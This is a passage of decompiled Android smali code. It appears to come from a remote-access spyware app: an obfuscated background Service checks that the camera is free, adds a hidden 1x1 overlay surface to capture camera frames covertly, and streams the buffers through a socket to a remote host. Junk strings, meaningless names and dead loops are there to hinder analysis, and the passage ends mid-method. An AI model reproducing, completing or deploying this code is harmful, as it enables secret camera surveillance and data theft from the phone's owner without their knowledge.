.class public Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;
.super Landroid/app/Service;
.source "etepaejhucdoifemyubbjerbt16.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

.field public static la_etepaejhucdoifemyubbjerbt16_y:Landroid/view/WindowManager$LayoutParams;

.field public static o_etepaejhucdoifemyubbjerbt16_ut:Ljava/io/OutputStream;

.field public static s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

.field public static s_etepaejhucdoifemyubbjerbt16_k:Ljava/net/Socket;

.field static st:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;

.field private static syc:Ljava/lang/Object;

.field public static w_etepaejhucdoifemyubbjerbt16_m:Landroid/view/WindowManager;


# instance fields
.field public Lo:Z

.field private b_etepaejhucdoifemyubbjerbt16_ts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field public ctd:Z

.field private q4:I

.field public usd:Z

.field private vul:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 40
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->syc:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 38
    iput-boolean v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->usd:Z

    iput-boolean v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->ctd:Z

    iput-boolean v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->Lo:Z

    .line 39
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->b_etepaejhucdoifemyubbjerbt16_ts:Ljava/util/List;

    const/16 v0, 0x32

    .line 42
    iput v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->q4:I

    return-void
.end method

.method static synthetic access$000(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;)V
    .locals 0

    .line 31
    invoke-direct {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->di()V

    return-void
.end method

.method static synthetic access$100()Ljava/lang/Object;
    .locals 1

    .line 31
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->syc:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$200(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;)Ljava/util/List;
    .locals 0

    .line 31
    iget-object p0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->b_etepaejhucdoifemyubbjerbt16_ts:Ljava/util/List;

    return-object p0
.end method

.method static synthetic access$300(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;)[Ljava/lang/String;
    .locals 0

    .line 31
    iget-object p0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$400(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;)I
    .locals 0

    .line 31
    iget p0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->q4:I

    return p0
.end method

.method static synthetic access$402(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;I)I
    .locals 0

    .line 31
    iput p1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->q4:I

    return p1
.end method

.method static synthetic access$500(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;II)I
    .locals 0

    .line 31
    invoke-direct {p0, p1, p2}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->q(II)I

    move-result p0

    return p0
.end method

.method private di()V
    .locals 6

    const-string v0, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    const/4 v1, 0x0

    .line 278
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 270
    iput-boolean v1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->Lo:Z

    .line 271
    sput-boolean v1, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->F_etepaejhucdoifemyubbjerbt111_ORCA:Z

    const/4 v1, 0x1

    .line 272
    :try_start_0
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_k:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto/16 :goto_5

    :catch_0
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 273
    :cond_0
    :goto_0
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_1

    .line 275
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 276
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    move-object v3, v2

    goto :goto_0

    .line 283
    :cond_1
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 284
    :cond_2
    :goto_1
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_3

    .line 286
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 287
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    move-object v3, v2

    goto :goto_1

    .line 293
    :cond_3
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 294
    :cond_4
    :goto_2
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_5

    .line 296
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 297
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    move-object v3, v2

    goto :goto_2

    .line 304
    :cond_5
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 305
    :cond_6
    :goto_3
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_7

    .line 307
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 308
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_6

    move-object v3, v2

    goto :goto_3

    .line 314
    :cond_7
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 315
    :cond_8
    :goto_4
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_9

    .line 317
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 318
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_8

    move-object v3, v2

    goto :goto_4

    .line 324
    :catch_1
    :cond_9
    :goto_5
    :try_start_1
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_k:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    .line 325
    :catch_2
    :try_start_2
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_k:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    .line 326
    :catch_3
    :try_start_3
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_k:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    .line 327
    :catch_4
    :try_start_4
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_k:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_6
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_5

    goto/16 :goto_b

    :catch_5
    nop

    goto/16 :goto_b

    :catch_6
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 328
    :cond_a
    :goto_6
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_b

    .line 330
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 331
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    move-object v3, v2

    goto :goto_6

    .line 338
    :cond_b
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 339
    :cond_c
    :goto_7
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_d

    .line 341
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 342
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_c

    move-object v3, v2

    goto :goto_7

    .line 348
    :cond_d
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 349
    :cond_e
    :goto_8
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_f

    .line 351
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 352
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_e

    move-object v3, v2

    goto :goto_8

    .line 359
    :cond_f
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 360
    :cond_10
    :goto_9
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_11

    .line 362
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 363
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_10

    move-object v3, v2

    goto :goto_9

    .line 369
    :cond_11
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 370
    :cond_12
    :goto_a
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_13

    .line 372
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 373
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_12

    move-object v1, v2

    goto :goto_a

    .line 379
    :cond_13
    :goto_b
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->o_etepaejhucdoifemyubbjerbt16_ut:Ljava/io/OutputStream;

    if-eqz v0, :cond_14

    .line 380
    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_7
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_7

    :catch_7
    const/4 v0, 0x0

    .line 381
    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->o_etepaejhucdoifemyubbjerbt16_ut:Ljava/io/OutputStream;

    :cond_14
    return-void
.end method

.method private q(II)I
    .locals 1

    const v0, 0xf000

    if-le p1, v0, :cond_0

    const/16 p2, 0xf

    goto :goto_0

    :cond_0
    const v0, 0xc800

    if-le p1, v0, :cond_1

    const/16 p2, 0x19

    goto :goto_0

    :cond_1
    const v0, 0xa000

    if-le p1, v0, :cond_2

    const/16 p2, 0x23

    goto :goto_0

    :cond_2
    const/16 v0, 0x7800

    if-le p1, v0, :cond_3

    const/16 p2, 0x2d

    goto :goto_0

    :cond_3
    const/16 v0, 0x5000

    if-le p1, v0, :cond_4

    const/16 p2, 0x41

    goto :goto_0

    :cond_4
    const/16 v0, 0x2800

    if-le p1, v0, :cond_5

    const/16 p2, 0x4b

    :cond_5
    :goto_0
    return p2
.end method


# virtual methods
.method public Completed_etepaejhucdoifemyubbjerbt16_App(Ljava/lang/String;I)V
    .locals 2

    .line 131
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16$1;

    invoke-direct {v1, p0, p1, p2}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16$1;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 267
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public c_etepaejhucdoifemyubbjerbt16_k()Z
    .locals 1

    .line 120
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    .line 125
    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    .line 127
    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    .line 610
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 611
    sput v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->s_etepaejhucdoifemyubbjerbt13_f1:I

    const/4 v0, 0x0

    .line 612
    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->st:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;

    .line 613
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->sp()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 19

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x2

    .line 47
    :try_start_0
    new-instance v3, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lginom/alfa/lib/scan/lrghmvbukiibxyrvyorrjtodk12;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "xyz"

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v0, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->sendBroadcast(Landroid/content/Intent;)V

    .line 49
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt18;->FTX1:Ljava/lang/String;

    const/4 v4, 0x1

    if-eqz v1, :cond_4

    .line 51
    invoke-virtual {v1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_4

    .line 55
    invoke-static {}, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->NeedSuper()Z

    move-result v5

    const/16 v6, 0x33

    if-eqz v5, :cond_1

    sget-object v5, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112wm:Landroid/view/WindowManager;

    if-eqz v5, :cond_1

    sget-object v5, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112lay:Landroid/view/WindowManager$LayoutParams;

    if-eqz v5, :cond_1

    .line 57
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    .line 58
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_k()Z

    move-result v1

    iput-boolean v1, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->usd:Z

    if-nez v1, :cond_0

    .line 61
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    .line 64
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112lay:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 65
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112wm:Landroid/view/WindowManager;

    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    sget-object v5, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112lay:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 66
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 67
    iget-object v1, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->Completed_etepaejhucdoifemyubbjerbt16_App(Ljava/lang/String;I)V

    goto/16 :goto_1

    .line 69
    :cond_0
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->sp()V

    goto :goto_1

    .line 74
    :cond_1
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    .line 75
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_k()Z

    move-result v1

    iput-boolean v1, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->usd:Z

    if-nez v1, :cond_3

    const-string v1, "window"

    .line 77
    invoke-virtual {v0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->w_etepaejhucdoifemyubbjerbt16_m:Landroid/view/WindowManager;

    .line 78
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    .line 80
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_2

    .line 81
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x1

    const/4 v9, 0x1

    const/16 v10, 0x7f6

    const/16 v11, 0x38

    const/4 v12, -0x3

    move-object v7, v1

